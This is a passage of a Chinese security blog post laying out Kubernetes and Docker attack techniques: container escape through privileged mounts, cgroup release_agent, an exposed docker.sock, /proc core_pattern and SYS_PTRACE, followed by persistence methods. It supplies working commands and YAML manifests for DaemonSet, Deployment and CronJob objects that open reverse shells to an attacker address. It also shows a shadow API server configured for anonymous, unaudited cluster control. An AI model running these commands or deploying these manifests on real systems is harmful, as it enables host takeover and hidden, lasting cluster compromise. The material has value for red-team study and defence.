<p>当容器为 privileged、sys_admin 等特殊配置时，可使用以下方法进行逃逸。（在容器内 CAPABILITIES sys_admin 其实是 privileged 的子集)</p>
<p><img src="/images/16697111047464.jpg" alt="">
<strong>方法一：<a href="https://github.com/cdk-team/CDK/wiki/Exploit:-mount-disk" target="_blank" rel="noopener">CDK</a></strong></p>
<p>其实就是挂载设备到容器的指定目录。（<code>mount /dev/sda3 /tmp/aaa</code>）</p>
<p><code>./cdk run mount-disk</code></p>
<p>然后可以写ssh 公钥、计划任务、<code>/root/.bashrc</code>等文件来获取宿主机权限。</p>
<p><strong>方法二：<a href="https://github.com/cdk-team/CDK/wiki/Exploit:-mount-cgroup" target="_blank" rel="noopener">CDK</a> （可直接执行命令）</strong></p>
<p>将宿主机cgroup目录挂载到容器内，随后劫持宿主机cgroup的<code>release_agent</code>文件，通过linux cgroup notify_on_release机制触发命令执行，完成逃逸。</p>
<p><code>./cdk_linux_amd64 run mount-cgroup &quot;ip a&quot;</code></p>
<p><strong>方法三：<a href="https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices" target="_blank" rel="noopener">CDK</a></strong></p>
<p>结合lxcfs利用的思路，挂载cgroup到指定目录。</p>
<p><code>./cdk run rewrite-cgroup-devices</code></p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#手动利用</span>
</span></span><span class="line"><span class="cl">mkdir /tmp/dev
</span></span><span class="line"><span class="cl">mount -t cgroup -o devices devices /tmp/dev/
</span></span><span class="line"><span class="cl"><span class="c1">#后续利用和上面lxcfs部分相同了，cgroup 已经挂载到了/tmp/dev/</span>
</span></span><span class="line"><span class="cl"><span class="c1">#当前容器的cgroup的devices.allow 路径可结合cat /proc/1/cgroup 进行查找</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="利用-dockersock"><a href="#利用-dockersock" class="anchor-link">#</a><a href="#contents:利用-dockersock" class="headings">利用 docker.sock</a></h3>
<p>当宿主机的 <code>/var/run/docker.sock</code> 被挂载容器内的时候，容器内就可以通过 docker.sock 在宿主机里创建任意配置（权限）的容器。一般来说docker.sock 是存在于docker daemon服务端的，但如果开发人员想在docker容器里运行docker命令，就会把宿主机的docker.sock挂载到容器内部。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#查看容器</span>
</span></span><span class="line"><span class="cl">curl -s --unix-socket /var/run/docker.sock <span class="s2">&#34;http://docker_daemon_ip/containers/json&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">curl -s --unix-socket /var/run/docker.sock -X POST <span class="s2">&#34;http://docker_daemon_ip/containers/{container_id}/exec&#34;</span> -H <span class="s2">&#34;Content-Type: application/json&#34;</span> --data-binary <span class="s1">&#39;{&#34;Cmd&#34;: [&#34;bash&#34;, &#34;-c&#34;, &#34;bash -i &gt;&amp; /dev/tcp/xxxx/1234 0&gt;&amp;1&#34;]}&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">curl -s --unix-socket /var/run/docker.sock -X POST <span class="s2">&#34;http://docker_daemon_ip/exec/{id}/start&#34;</span> -H <span class="s2">&#34;Content-Type: application/json&#34;</span> --data-binary <span class="s2">&#34;{}&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#创建特权容器（后续可逃逸至宿主机）</span>
</span></span><span class="line"><span class="cl">docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v <span class="s2">&#34;/proc:/host/proc&#34;</span> -v <span class="s2">&#34;/sys:/host/sys&#34;</span> -v <span class="s2">&#34;/:/rootfs&#34;</span> --network<span class="o">=</span>host --privileged<span class="o">=</span><span class="nb">true</span> --cap-add<span class="o">=</span>ALL alpine:latest
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="利用-proc-目录的挂载"><a href="#利用-proc-目录的挂载" class="anchor-link">#</a><a href="#contents:利用-proc-目录的挂载" class="headings">利用 /PROC 目录的挂载</a></h3>
<p>主要是利用了 linux 的 <code>/proc/sys/kernel/core_pattern</code> 文件，让我们可以逃逸并在外部执行命令。</p>
<p><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-mount-procfs" target="_blank" rel="noopener">CDK</a> 有此实现。</p>
<p><code>cdk run mount-procfs &lt;proc-dir&gt; &quot;&lt;shell-cmd&gt;&quot;</code></p>
<h3 id="利用-sys_ptrace-权限"><a href="#利用-sys_ptrace-权限" class="anchor-link">#</a><a href="#contents:利用-sys_ptrace-权限" class="headings">利用 SYS_PTRACE 权限</a></h3>
<p>当创建 docker 容器时，设置<code>--cap-add=SYS_PTRACE</code> 或 创建 k8s 容器时，设置 <code>securityContext.capabilities</code>为 SYS_PTRACE 时，可能导致容器逃逸。拥有了该权限就可以在容器内执行 strace 和 ptrace 等工具。</p>
<p><img src="/images/16697111170189.jpg" alt="">
存在SYS_PTRACE权限，并且挂载宿主机的PID空间时，可以通过strace 抓取宿主机ssh密码。创建这种权限的容器也可以较好的绕过HIDS或k8s安全策略的限制。</p>
<p><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-check-ptrace" target="_blank" rel="noopener">CDK</a> 有检查此权限的模块。</p>
<h3 id="cve-提权"><a href="#cve-提权" class="anchor-link">#</a><a href="#contents:cve-提权" class="headings">CVE 提权</a></h3>
<p><a href="https://github.com/neargle/my-re0-k8s-security#57-cve-2020-15257-%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">漏洞分析</a></p>
<p>Docker 逃逸：CVE-2019-5736、CVE-2019-14271、CVE-2020-15257</p>
<p>k8s提权到接管集群：CVE-2018-1002105、CVE-2020-8558</p>
<p>某些逃逸漏洞在<a href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN" target="_blank" rel="noopener">CDK</a> 中有实现。</p>
<h2 id="权限维持"><a href="#权限维持" class="anchor-link">#</a><a href="#contents:权限维持" class="headings">权限维持</a></h2>
<ol>
<li>
<p><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver" target="_blank" rel="noopener"><strong>部署 shadow apiserver</strong></a></p>
<p>shadow apiserver 具有和集群中现有的apiserver 一致的功能，同时开启了全部K8s管理权限，接受匿名请求且不保存审计日志。便于攻击者无痕迹的管理整个集群以及下发后续渗透行动。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#不在容器中执行</span>
</span></span><span class="line"><span class="cl"><span class="c1">#指定api server的地址</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KUBERNETES_SERVICE_HOST</span><span class="o">=</span><span class="s2">&#34;192.168.223.142&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KUBERNETES_SERVICE_PORT</span><span class="o">=</span><span class="s2">&#34;6443&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#./admin_token 为token所在的路径</span>
</span></span><span class="line"><span class="cl">./cdk run k8s-shadow-apiserver ./admin_token
</span></span><span class="line"><span class="cl"><span class="c1">#在容器中执行</span>
</span></span><span class="line"><span class="cl">./cdk run k8s-shadow-apiserver default
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#cdk将在配置文件中添加以下选项：</span>
</span></span><span class="line"><span class="cl">--allow-privileged
</span></span><span class="line"><span class="cl">--insecure-port<span class="o">=</span><span class="m">9443</span>
</span></span><span class="line"><span class="cl">--insecure-bind-address<span class="o">=</span>0.0.0.0
</span></span><span class="line"><span class="cl">--secure-port<span class="o">=</span><span class="m">9444</span>
</span></span><span class="line"><span class="cl">--anonymous-auth<span class="o">=</span><span class="nb">true</span>
</span></span><span class="line"><span class="cl">--authorization-mode<span class="o">=</span>AlwaysAllow
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
<li>
<p><strong>利用 DaemonSet/Deployment</strong></p>
<p>DaemonSet 能够确保全部（或某些）节点上运行一个Pod 的副本。当有节点加入集群时，也会为它们新增一个Pod；当有节点从集群移除时，这些Pod也会被回收。<strong>如果DaemonSet 监测到Pod退出，也将自动在相同节点上重建一个新Pod。</strong></p>
<ul>
<li>
<p>如果利用管理员凭证在目标集群内创建一个内容为反弹shell的DaemonSet，就能够实现集群所有节点自动化反弹shell（通过创建特权Pod） 。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apiVersion: apps/v1
</span></span><span class="line"><span class="cl">kind: DaemonSet
</span></span><span class="line"><span class="cl">metadata:
</span></span><span class="line"><span class="cl">  name: kube-api-self
</span></span><span class="line"><span class="cl">  namespace: kube-system
</span></span><span class="line"><span class="cl">spec:
</span></span><span class="line"><span class="cl">  selector:
</span></span><span class="line"><span class="cl">    matchLabels:
</span></span><span class="line"><span class="cl">      app: kube-api-self
</span></span><span class="line"><span class="cl">  template:
</span></span><span class="line"><span class="cl">    metadata:
</span></span><span class="line"><span class="cl">      labels:
</span></span><span class="line"><span class="cl">        app: kube-api-self
</span></span><span class="line"><span class="cl">    spec:
</span></span><span class="line"><span class="cl">      hostNetwork: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">      hostPID: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">      containers:
</span></span><span class="line"><span class="cl">      - name: main
</span></span><span class="line"><span class="cl">        image: bash
</span></span><span class="line"><span class="cl">        imagePullPolicy: IfNotPresent
</span></span><span class="line"><span class="cl">        command: <span class="o">[</span><span class="s2">&#34;bash&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">        args: <span class="o">[</span><span class="s2">&#34;-c&#34;</span>, <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0&gt;&amp;1&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">        securityContext:
</span></span><span class="line"><span class="cl">          privileged: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">        volumeMounts:
</span></span><span class="line"><span class="cl">        - mountPath: /host
</span></span><span class="line"><span class="cl">          name: host-root
</span></span><span class="line"><span class="cl">      volumes:
</span></span><span class="line"><span class="cl">      - name: host-root
</span></span><span class="line"><span class="cl">        hostPath:
</span></span><span class="line"><span class="cl">          path: /
</span></span><span class="line"><span class="cl">          type: Directory
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
<li>
<p>Deployment 也是确保在任何时候都有特定数量的Pod副本处于运行状态，容器被删除后会自动创建恢复容器。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apiVersion: apps/v1
</span></span><span class="line"><span class="cl">kind: Deployment
</span></span><span class="line"><span class="cl">metadata:
</span></span><span class="line"><span class="cl">  name: nginx-deploy
</span></span><span class="line"><span class="cl">  labels:
</span></span><span class="line"><span class="cl">    k8s-app: nginx-demo
</span></span><span class="line"><span class="cl">spec:
</span></span><span class="line"><span class="cl">  replicas: <span class="m">2</span>
</span></span><span class="line"><span class="cl">  selector:
</span></span><span class="line"><span class="cl">    matchLabels:
</span></span><span class="line"><span class="cl">      app: nginx
</span></span><span class="line"><span class="cl">  template:
</span></span><span class="line"><span class="cl">    metadata:
</span></span><span class="line"><span class="cl">      labels:
</span></span><span class="line"><span class="cl">        app: nginx
</span></span><span class="line"><span class="cl">    spec:
</span></span><span class="line"><span class="cl">      hostNetwork: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">      hostPID: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">      containers:
</span></span><span class="line"><span class="cl">      - name: nginx
</span></span><span class="line"><span class="cl">        image: nginx:1.7.9
</span></span><span class="line"><span class="cl">        imagePullPolicy: IfNotPresent
</span></span><span class="line"><span class="cl">        command: <span class="o">[</span><span class="s2">&#34;bash&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">        args: <span class="o">[</span><span class="s2">&#34;-c&#34;</span>, <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/192.168.223.143/2333 0&gt;&amp;1&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">        securityContext:
</span></span><span class="line"><span class="cl">          privileged: <span class="nb">true</span>
</span></span><span class="line"><span class="cl">        volumeMounts:
</span></span><span class="line"><span class="cl">        - mountPath: /host
</span></span><span class="line"><span class="cl">          name: host-root
</span></span><span class="line"><span class="cl">      volumes:
</span></span><span class="line"><span class="cl">      - name: host-root
</span></span><span class="line"><span class="cl">        hostPath:
</span></span><span class="line"><span class="cl">          path: /
</span></span><span class="line"><span class="cl">          type: Directory
</span></span></code></pre></td></tr></table></div>
</div>
</div><div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#进行部署</span>
</span></span><span class="line"><span class="cl">kubectl create -f 1.ymal
</span></span><span class="line"><span class="cl"><span class="c1">#删除部署</span>
</span></span><span class="line"><span class="cl">kubectl delete -f 1.ymal
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
</ul>
</li>
<li>
<p><strong>CronJob 持久化</strong></p>
<p><code>kubectl get CronJob</code> 查看定时任务</p>
<p>CronJob 用于执行周期性的动作，例如备份、报告生成等，攻击者可以利用此功能持久化。</p>
<p><a href="https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob" target="_blank" rel="noopener">CDK 也可以一键部署</a></p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apiVersion: batch/v1
</span></span><span class="line"><span class="cl">kind: CronJob
</span></span><span class="line"><span class="cl">metadata:
</span></span><span class="line"><span class="cl">  name: hello
</span></span><span class="line"><span class="cl">spec:
</span></span><span class="line"><span class="cl">  schedule: <span class="s2">&#34;*/1 * * * *&#34;</span> <span class="c1">#每分钟执行一次</span>
</span></span><span class="line"><span class="cl">  jobTemplate:
</span></span><span class="line"><span class="cl">    spec:
</span></span><span class="line"><span class="cl">      template:
</span></span><span class="line"><span class="cl">        spec:
</span></span><span class="line"><span class="cl">          containers:
</span></span><span class="line"><span class="cl">          - name: hello
</span></span><span class="line"><span class="cl">            image: nginx
</span></span><span class="line"><span class="cl">            imagePullPolicy: IfNotPresent
</span></span><span class="line"><span class="cl">            command:
</span></span><span class="line"><span class="cl">            - /bin/bash
</span></span><span class="line"><span class="cl">            - -c
</span></span><span class="line"><span class="cl">            - <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/192.168.223.143/2333 0&gt;&amp;1&#34;</span>
</span></span><span class="line"><span class="cl">          restartPolicy: Always#也可以利用在普通pods当中，始终重启
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>也可以为普通pod增加<code>restartPolicy: Always</code>，能够达到CronJob的效果。</p>
</li>
<li>
<p><strong><a href="https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/static-pod/" target="_blank" rel="noopener">StaticPod</a></strong></p>
<p>静态 Pod 在指定的节点上由 kubelet 守护进程直接管理，不需要 API 服务器监管。kubelet 监视每个静态 Pod（在它失败之后重新启动）。</p>
</li>
<li>
<p><strong><a href="https://github.com/Metarget/k0otkit" target="_blank" rel="noopener">k0otkit</a></strong></p>
<p>k0otkit 可以快速、隐蔽和连续的方式控制目标 Kubernetes 集群中的<strong>所有节点</strong>。</p>
<p>更多技巧，反弹至msf、容器镜像等问题，参考：<a href="http://blog.nsfocus.net/k0otkithack-k8s-in-a-k8s-way/" target="_blank" rel="noopener">K0OTKIT：HACK K8S IN A K8S WAY</a>。</p>
</li>
</ol>
<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
<ol>
<li><a href="https://mp.weixin.qq.com/s/T2QGLlKwjaUByDtGFL94PQ" target="_blank" rel="noopener">k8s安全入门</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NjgzNjA5NQ==&amp;mid=2247514880&amp;idx=1&amp;sn=7c4ec3f2cdd9a1cbb6afdc45638d5fa0&amp;source=41#wechat_redirect" target="_blank" rel="noopener">【技术推荐】云原生之Kubernetes安全</a></li>
<li><a href="https://security.tencent.com/index.php/blog/msg/183" target="_blank" rel="noopener">红蓝对抗中的云原生漏洞挖掘及利用实录</a></li>
</ol>

            </div>

            
    
    
        <ul class="post-copyright">
            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
            
                
                
                
                
                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2022/11/Kubernetes-%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://myzxcg.com/2022/11/Kubernetes-实际利用与分析/</a></li>
            
            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
            
        </ul>
    



        </article>

        

        


        


        


        
    
    
        <div class="related-posts">
            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
            <ul class="related-list">
                
                    <li class="related-item">
                        <a href="/2022/11/Kubernetes-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="related-link">Kubernetes 环境搭建与基础知识</a>
                    </li>
                
            </ul>
        </div>
    



        


        
    <footer class="minimal-footer">
        
            <div class="post-tag"><a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/" rel="tag" class="post-tag-link">#云原生安全</a></div>
        
        
        
            
        
    </footer>



        


        
    
        
        
    
    
    
    
        <ul class="post-nav">
            
                <li class="post-nav-prev">
                    <a href="/2023/03/%E7%BA%AFC%E9%87%8D%E6%9E%84CS-Beacon-%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%BC%80%E5%8F%91%E5%AE%9E%E7%8E%B0/" rel="prev">&lt; 纯C重构CS Beacon - 原理详解与开发实现</a>
                </li>
            
            
                <li class="post-nav-next">
                    <a href="/2022/11/Kubernetes-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="next">Kubernetes 环境搭建与基础知识 &gt;</a>
                </li>
            
        </ul>
    



        
    

        
            <div class="load-comments">
                <div id="load-comments">加载评论</div>
            </div>
        

        

        

        
            <div id="utterances"></div>
        

        
    



    </div>
</main>


            
    <div id="back-to-top" class="back-to-top">
        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
    </div>


            
    <footer id="footer" class="footer">
        <div class="footer-inner">
            

            
    
        <ul class="socials"><li class="socials-item">
                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
                </li><li class="socials-item">
                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
                </li><li class="socials-item">
                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
                </li><li class="socials-item">
                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
                </li></ul>
    


            <div class="site-info">©&nbsp;2023&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
              </div>

            
        </div>
    </footer>


        </div>
        

        






    

        

        

        
            <script>
    function loadComments() {
        (function() {
            var utterances = document.getElementById("utterances");
            var script = document.createElement('script');
            script.src = 'https://utteranc.es/client.js';
            script.async = true;
            script.crossOrigin = 'anonymous';
            script.setAttribute('repo', 'myzxcg\/myzxcg.github.io');
            script.setAttribute('issue-term', 'title');
            const isDark = getCurrentTheme() === 'dark';
        if (isDark) {
            script.setAttribute('theme', 'photon-dark');
        } else {
            script.setAttribute('theme', 'github-light');
        }
            
            utterances.appendChild(script);
        })();
    }
</script>
        

        

    



    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>

<script>
    let imgNodes = document.querySelectorAll('div.post-body img');
    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");

    mediumZoom(imgNodes, {
        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
    })
</script>




    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>







    </body>
</html>
